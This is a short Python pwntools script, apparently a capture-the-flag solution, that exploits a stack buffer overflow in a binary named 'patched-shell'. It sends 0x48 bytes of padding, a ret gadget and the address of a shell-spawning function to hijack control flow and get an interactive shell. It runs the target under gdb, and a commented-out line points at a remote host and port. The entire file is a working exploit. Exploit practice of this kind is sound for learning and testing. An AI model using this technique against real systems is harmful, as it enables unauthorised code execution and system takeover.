from pwn import *

io = process("./patched-shell")
# io = remote("34.134.173.142", 5000)
io = gdb.debug("./patched-shell", 
'''
b *0x000000000040116a
c
''')
ret = 0x40116b
shell = 0x401136
payload = b'a' * 0x48
payload += p64(ret)
payload += p64(shell)
io.sendline(payload)

io.interactive()